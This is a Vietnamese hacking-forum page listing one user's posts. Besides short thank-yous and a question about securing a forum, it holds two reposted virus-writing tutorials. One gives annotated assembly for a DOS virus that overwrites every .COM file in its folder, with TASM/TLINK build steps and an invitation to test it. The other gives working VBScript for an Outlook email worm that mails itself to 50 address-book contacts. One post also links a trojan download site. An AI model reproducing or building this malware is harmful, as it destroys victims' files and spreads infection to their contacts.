<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by jackly, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by jackly - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/124881.html" name="top" class="maintitle" id="top">Messages posted by: jackly</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/124881.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/124881.html">Profile for jackly</a> 
            			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/124881.html">Messages posted by jackly</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">0</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/1234.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/1234/6191.html#6191,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">thank verry cái mã nguồn em đó ! </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.html">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/1325.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/1325/6189.html#6189,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">xin các anh em nào biết các phương pháp bảo mật cho IPb thì hãy hướng dẫn cụ thể cho newbie để các bạn có thể từng bước làm quen với bảo mật nhé ! . nên hướng dẫn cách bảo mật theo từng bước chứ đừng post các bài thảo luận và nghiên cứu vì nghiên cứu và thảo luận đã có box kia rồi !<br/> tui chỉ biết có 2 bước là lập firewall bằng tường lửa mới cung cấp trong đại hội webmaster lần trước , bước thứ 2 là bảo mật bằng file .htaccess giống HVA vậy ! còn các chiêu nào nữa không anh em ! nghe nói nhiều về hệ thống bảo mật rồi mà chưa thấy nó ra sao ! vậy cách lập thế nào vậy ! lập một hệ thống phòng thủ ấy ! thân !</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/690.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/690/2949.html#2949,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">mới thấy một cái link hay hay nè bạn http://www.hackpr.net/troyanos.php</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/690.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/690/2948.html#2948,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">bạn xem bài " nơi lưu trữ trojan ... " đi bạn </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.html">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/404.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/404/1264.html#1264,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">cai nay co y tuong moi do ! thank </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/392.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/392/1257.html#1257,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><font color='blue'>cái này cũng giống cái code popup thôi mà ! nguyên lí tương tự </font></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/396.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/396/1247.html#1247,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">================================================== =========<br/><br/> tim_file:<br/><br/> xor cx,cx<br/> Việc tiếp theo cần làm là giá trị trong CX =0, chúng ta có thể làm bằng 2 cách , một là MOV CX, 0, hai là XOR CX, CX tuy nhiên nấu sử dụng MOV CX,0 chúng ta sẽ mất 3 bytes trong khi sử dụng XOR CX,CX chúng ta chỉ mất 2 bytes và chúng đều có chức năng set cho CX =0. Vậy thì tốt hơn là nên chọn XOR CX,CX<br/><br/> ================================================== =========<br/><br/> lea dx,comsig<br/><br/> Tiếp theo chúng ta cần nạp chuỗi với file chỉ định mà chúng ta tìm kiếm vào DX.<br/><br/> Chúng ta đang tìm file . COM. Vi vay chuỗi cần tìm là *.COM. Đây là cách tìm kiếm những tập tin có đuôi là *.COM. Chuỗi này được xác định tại địa chỉ comsig trong data segment của virus . Và để chuyển chuỗi đó vào DX chúng ta thực hiện lệnh<br/><br/> LEA DX, comsig, &lt;L&gt;oad the &lt;E&gt;ffective &lt;A&gt;ddress of comsig into DX. Chúng ta cũng có thể sử dụng lệnh MOV bằng cách như sau<br/><br/> MOV DX, offset comsig. ================================================== =========<br/><br/> int 21h<br/><br/> Nói chung lệnh ngắt để dừng chương trình lại và thực hiện một công việc nào đó .Co 256 lệnh ngắt các bạn có thể tham khảo thêm ở các sách dạy hợp ngữ .Ở đoạn mã này của virus sau khi chuyển 4e hex vào AX xóa CX, chuyển chuỗi chỉ định tên file cần tìm ta thực hiện lệnh ngắt int 21 để chương trình bắt đầu tìm tệp đầu tiên với thuôc tính cho trước trong CX và DX (các bạn tra trong sách hợp ngữ về các chức năng của ngắt int 21 để biết thêm chi tiết)<br/><br/> ================================================== =========<br/><br/> jc ketthuc<br/><br/> Đây là một lệnh nhảy có điều kiên. Nếu một file được tìm thấy cờ carry được set là zero nếu không tìm thấy cờ carry set thành 1 lệnh JC kiểm tra nếu cờ carry bằng 1nó sẽ nhảy tới vị trí có nhãn wart_growth và thi hành lệnh tại offset đó .Và đoạn mã này có chức nằng như sau: nó kiểm tra xem nếu tìm thấy thì tiến hành các bước làm nhiễm file nếu không thì nhãy tời đoạn mã báo hiệu bạn đã làm nhiễm thành cộng tất cả các file .Com trong thư mục chứa nó .<br/><br/> ================================================== ===========<br/><br/> mo_file:<br/><br/> mov ax,3d02h<br/><br/> mov dx,9eh<br/><br/> int 21h<br/> Đoạn mã này được thực hiện khi đã tìm thấy một file .COM trong thư mục đầu tiên cần nạp 3D vào AL và 02h có nghĩa là mở file trong chế độ đọc/ghi. 00h trong AL sẽ mở file ở chế độ chỉ đọc , 01h trong AL là chỉ ghi. Nhớ rằng AX là thanh ghi 16-bit gồm, AH và AL.Vi vay chúng ta có thể nạp hai giá trị cùng lúc . bằng cách nạp AX với 3d02h. Nhớ rằng chúng ta luôn luôn sử dụng gia trị ở hệ hex. Một lỗi đơn giản nhưng hay gặp phải là thiếu "h" sau int 21 hay sau các số ở hệ HEX bạn cần chú ý . Nếu thiếu Hex máy tính sẽ nghĩ bạn sử dụng hệ thập phân và dĩ nhiên trong hệ thập phân máy tính sẽ coi D,E,F chả ra củ khoai gì .... Tiếp theo chúng ta cần nạp vào DX một chuỗi ASCII là tên của file .Như bạn nhìn ở trên 9e hex không phải là một chuỗi ;nó thực ra là offset của địa chỉ chứa chuỗi chúng ta cần. 9e hex được xác định trong PSP trong một vùng gọi là DTA hay &lt;D&gt;isk &lt;T&gt;ransfer &lt;A&gt;rea. PSP bắt đầu tại 00h. Địa chỉ bắt đầu của DTA la 80 hex.Trong DTA là thông tin trên file đã được tìm thấy. Những gì chúng ta cần là file name, được xác định tại offset 1eh từ phần bắt đầu của DTA. Cộng 80 với 1eh ta có 9eh. Nạp 9e hex vào thanh ghi DX chúng ta có file name . bây giờ thức hiện int 21h để thi hành thủ tục trên.<br/><br/> ================================================== ============<br/><br/> nhiem_file:<br/><br/> xchg bx,ax<br/><br/> mov ah,40h<br/><br/> mov cx,offset horny - offset first_fly<br/><br/> lea dx,first_fly<br/><br/> int 21h<br/> Đây là phần làm nhiêm file sau khi đã mở nó .Ở đoạn mã trước File handle của file được mở nằm trong AX chúng ta cần nó nằm trong BX vậy nên thực hiện lệnh<br/><br/> xchg bx,ax bằng cách này toàn bộ giá trị trong ax sẽ chuyển vào bx . CX cần được nạp một số lượng byte mà chúng ta muốn ghi vào. Và thay vì ta sử dụng một con số nào đó để chỉ định số bytes ta để máy tính tính khoảng cách từ 2 offset nhãn horny và firts_fly như vậy khoảng cách từ nhãn first_fly đến horny là số lượng bytes mà chúng ta muốn ghi vào file. Cuối cùng, DX cần được nạp địa chỉ mà chúng ta muốn ghi và địa chỉ cua first_fly được nạp vào DX. Đó là phần bắt đầu của mã mà chúng ta muốn ghi vào file tìm thấy .Sau đó thực hiện int 21 sẽ hoàn tất việc làm nhiễm file.<br/><br/> ================================================== =========<br/><br/> stitch_up:<br/><br/> mov ah,3eh<br/><br/> int 21h<br/><br/> mov ah,4fh<br/><br/> jmp find_fly<br/><br/><br/> Sau khi file đã bị nhiễm chúng ta cần đóng file đó lại và đây là đoạn mã thực hiện việc này. Sau khi đóng file chúng ta nạp 4f hex vào AH rồi nhảy trở về đoạn mã để tìm file .COM kế tiếp. Và nó sẽ thực hiện việc nhiễm file cho đến khi nào tất cả file .COM trong thu muc chưa nó đã bị nhiễm.Lúc đó cờ carry=1 và lệnh nhảy jc sẽ hoạt động đưa ra thông báo chúc mừng.<br/><br/> ================================================== =================<br/><br/> Ketthuc:<br/><br/> mov ah,9<br/><br/> mov dx,offset wart<br/><br/> int 21h<br/><br/><br/> ================================================== ================<br/><br/> cya: int 20h<br/><br/> Chức năng của int 20 là kết thúc chương trình , tuy nhiên cách hiện nay hay dùng là MOV AH,4CH<br/><br/> int 21<br/><br/> ================================================== ================<br/><br/> comsig db "*.com",0<br/><br/> msgadd db 'Congratulations! You have infected all the COM files<br/><br/> in this',10,13<br/><br/> db 'Have a nice day.',10,13,'$'<br/><br/> Đây là data segment nói một cách nọm na là tương tự như bạn khai báo hằng (Const) ở pascal,C++ vậy.Và các hằng này sẽ được sử dụng trong code segment. Chúng ta sử dụng định nghĩa byte DB, để định nghĩa một chuỗi. Việc đặt 10,13 sau các chuỗi giúp cho việc hiển thị nó có thứ tự nếu không cả hai chuỗi sẽ hiển thị cùng lúc lên màn hinh $ tại phần cuối của dòng 2 báo hiệu kết thúc chuôi ================================================== =================<br/><br/> horny label near<br/><br/> nhãn horny chỉ có một mục đích là để xác điịnh offset trong việc xác định số byte ghi vào file cần làm nhiễm ================================================== =================<br/><br/> virus endp<br/><br/> code ends<br/><br/> end first_fly<br/><br/> kết thúc chương trình<br/> ================================================== ==============<br/><br/> Biên dịch virus :<br/><br/> Bạn cần có TASM hay MASM. Trongbài này tôi hướng dẫn các bạn biên dịch virus bằng TASM. Các file cần có virus.asm TASM.EXE, TLINK<br/><br/> Đầu tiên lưu nó thành file ".asm" file,có thể sử dụng Notepad để soạn thảo mã rồi save as virus.asm. Sử dụng TASM gõ lệnh:<br/><br/> C:\&gt;tasm virus.asm<br/><br/> Kết quả có thể là như sau:<br/><br/> Turbo Assembler Version 2.01<br/><br/> Assembling file: virus.asm<br/><br/> Error Messages: none<br/><br/> Warning Messages: none<br/><br/> Passes: 1<br/><br/> Remaining Memory: 418k (or something similar)<br/><br/> Nếu không có lỗi nào, nếu có lỗi nó sẽ báo cho bạn biết lỗi gì ở dòng nào .<br/><br/> Sau khi gõ lệnh TASM &lt;asm file&gt; bạn sẽ được file *.obj<br/><br/> Để tạo COM file bạn gõ lệnh:<br/><br/> C:\&gt;tlink /t virus.obj<br/><br/> Tlink sẽ tạo ra file virus.COM<br/><br/> Bây giờ hãy thử nghiệmvirus của bạn, mở Notepad lên, ghi gì tùy bạn , không ghi cũng được lưu thành file vidu.com. đặt nóvào thư muc của virus bạn vừa biên dịch. Rồi chạy virus bạn sẽ thấy kích thước của file vidu.com bây giờ sẽ bằng kích thước của virus(180 bytes). Tuy nhiên nhược virus này sẽ làm nhiễm tất cả các file .com trong thư mục chứa nó mà không cần biết file đó đã bị nhiễm hay chưa, ở phần sau tôi sẽ hướng dẫn các bạn cách để kiểm tra xem một file đã bị nhiễm hay chưa. Và cònmột điều nữa là virus này không có tác dụng với những file .com có size lớn hơn nó (đây chỉ là để minh họa nên tôi nghĩ như vậy là đủ)<br/><br/> ================================================== =============<br/><br/> Appendix 1 - The Registers<br/><br/> AX Accumulator register<br/><br/> BX Base register<br/><br/> CX Counting register<br/><br/> DX Data register<br/><br/> DS Data Segment register<br/><br/> ES Extra Segment register<br/><br/> SS Stack Segment register<br/><br/> CS Code Segment register<br/><br/> BP Base Pointers register<br/><br/> SI Source Index register<br/><br/> DI Destiny Index register<br/><br/> SP Stack Pointer register<br/><br/> IP Next Instruction Pointer register<br/><br/> F Flag register<br/><br/> -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_<br/><br/> Appendix 2 - The PSP<br/><br/> Format of Program Segment Prefix (PSP):<br/><br/> Offset Size Description (Table 1032)<br/><br/> 00h 2 BYTEs INT 20 instruction for CP/M CALL 0 program termination<br/><br/> the CDh 20h here is often used as a signature(chu ky) for a valid PSP<br/><br/> 02h WORD segment of first byte beyond memory allocated to program<br/><br/> 04h BYTE (DOS) unused filler<br/><br/> (OS/2) count of fake DOS version returns<br/><br/> 05h BYTE CP/M CALL 5 service request (FAR CALL to absolute 000C0h)<br/><br/> BUG: (DOS 2+ DEBUG) PSPs created by DEBUG point at 000BEh<br/><br/> 06h WORD CP/M compatibility--size of first segment for .COM files<br/><br/> 08h 2 BYTEs remainder of FAR JMP at 05h<br/><br/> 0Ah DWORD stored INT 22 termination address<br/><br/> 0Eh DWORD stored INT 23 control-Break handler address<br/><br/> 12h DWORD DOS 1.1+ stored INT 24 critical error handler address<br/><br/> 16h WORD segment of parent PSP<br/><br/> 18h 20 BYTEs DOS 2+ Job File Table, one byte per file handle, FFh = closed<br/><br/> 2Ch WORD DOS 2+ segment of environment for process (see #1033)<br/><br/> 2Eh DWORD DOS 2+ process's SS:SP on entry to last INT 21 call<br/><br/> 32h WORD DOS 3+ number of entries in JFT (default 20)<br/><br/> 34h DWORD DOS 3+ pointer to JFT (default PSP:0018h)<br/><br/> 38h DWORD DOS 3+ pointer to previous PSP (default FFFFFFFFh in 3.x)<br/><br/> used by SHARE in DOS 3.3<br/><br/> 3Ch BYTE DOS 4+ (DBCS) interim console flag (see AX=6301h)<br/><br/> Novell DOS 7 DBCS interim flag as set with AX=6301h<br/><br/> (possibly also used by Far East MS-DOS 3.2-3.3)<br/><br/> 3Dh BYTE (APPEND) TrueName flag (see INT 2F/AX=B711h)<br/><br/> 3Eh BYTE (Novell NetWare) flag: next byte initialized if CEh<br/><br/> (OS/2) capabilities flag<br/><br/> 3Fh BYTE (Novell NetWare) Novell task number if previous byte is CEh<br/><br/> 40h 2 BYTEs DOS 5+ version to return on INT 21/AH=30h<br/><br/> 42h WORD (MSWindows3) selector of next PSP (PDB) in linked list<br/><br/> Windows keeps a linked list of Windows programs only<br/><br/> 44h WORD (MSWindows3) "PDB_Partition"<br/><br/> 46h WORD (MSWindows3) "PDB_NextPDB"<br/><br/> 48h BYTE (MSWindows3) bit 0 set if non-Windows application (WINOLDAP)<br/><br/> 49h BYTE unused by DOS versions &lt;= 6.00<br/><br/> 4Ch WORD (MSWindows3) "PDB_EntryStack"<br/><br/> 4Eh 2 BYTEs unused by DOS versions &lt;= 6.00<br/><br/> 50h 3 BYTEs DOS 2+ service request (INT 21/RETF instructions)<br/><br/> 53h 2 BYTEs unused in DOS versions &lt;= 6.00<br/><br/> 55h 7 BYTEs unused in DOS versions &lt;= 6.00; can be used to make first FCB<br/><br/> into an extended FCB<br/><br/> 5Ch 16 BYTEs first default FCB, filled in from first commandline argument<br/><br/> overwrites second FCB if opened<br/><br/> 6Ch 16 BYTEs second default FCB, filled in from second commandline argument<br/><br/> overwrites beginning of commandline if opened<br/><br/> 7Ch 4 BYTEs unused<br/><br/> 80h 128 BYTEs commandline / default DTA<br/><br/> command tail is BYTE for length of tail, N BYTEs for the tail,<br/><br/> followed by a BYTE containing 0Dh<br/><br/> ------------------------------------------------------------------------------<br/><br/> Appendix 3 - Examples of various JUMP commands<br/><br/> JA - Jump if Above<br/><br/> JAE - Jump if Above/Equal<br/><br/> JB - Jump if Below<br/><br/> JBE - Jump if Below/Equal<br/><br/> JC - Jump if Carry<br/><br/> JE - Jump if Equal<br/><br/> JG - Jump if Greater<br/><br/> JGE - Jump if Greater/Equal<br/><br/> JL - Jump if Less<br/><br/> JLE - Jump if Less/Equal<br/><br/> JMP - Jump<br/><br/> JNA - Jump if Not Above<br/><br/> JNAE - Jump if Not Above/Equal<br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/396.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/396/1246.html#1246,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">ah ! hy vongj cho nayf cho minhf post bai suu tam ve virus de minh dong gop kien thuc vao nhe ! hi<br/> . bai nay suu tam dau do o viet hacker hay HVA cac ban thi phai ! hi<br/><br/><br/> Trước tiên tôi nói về cách làm thế nào để viết một Email-Worn bằng VisualbasicScript:Việc sử dụng VBS để viết virus có thể nói là khá phổ biến, điển hình như virus loveletter,Anakournikova,mawanella ..<br/><br/> Ở đây tôi chỉ phân tích chi tiết về mã nguồn có chức năng là làm lây lan virus , còn tác dụng (đối với người code virus) và tác hại đối với vixtim như thế nào là tùy vào mỗi virus)<br/><br/> -------------------source code-------------<br/><br/> On Error Resume Next<br/> Dim x<br/> Set so=CreateObject("Scripting.FileSystemObject")<br/> so.GetFile(WScript.ScriptFullName).Copy("C:\virusn ame.vbs")<br/> Set ol=CreateObject("Outlook.Application")<br/> For x=1 To 50<br/> Set Mail=ol.CreateItem(0)<br/> Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).Ad dressEntries(x)<br/> Mail.Subject="Tiêu đề của thư"<br/> Mail.Body="nội dung thư"<br/> Mail.Attachments.Add("C:\virusname.vbs")<br/> Mail.Send<br/> Next<br/> ol.Quit<br/><br/> -----------------------------------<br/><br/> Với những người đã quen với lập trình VB thì không khó để hiểu đoạn mã này.<br/><br/> Đầu tiên nó sẽ tìm trong AddressBook của victim ,ở đây biến x chạy từ 1 đến 50 tương ứng với việc<br/><br/> Nó sẽ tìm 50 địa chỉ trong Address list, và gửi mail đến các địa chỉ đó với tiêu đề và nội dung cho trước<br/><br/> Và nó sẽ đính kèm chính nó vào bức thư đó, như vậy khi victim click vào nó sẽ hoạt động, cứ như vạy mà lây lan.<br/><br/> Để tìm hiểu thêm các bạn có thể xem mã nguồn của virus AnnaKournikova dưới đây, bạn có thể thấy ở hàm OutLook của virus AnnaKournikova cũng sử dụng cách thức gần giống với đoạn mã phía trên.Đối với virus *.vbs thì chỉ cần code mã nguồn bằng notepad rồi save as *.vbs là xong. Và cách thức vô hiệu hóa virus dạng này (chỉ là tạm thời trước khi có trình diệt virus cần 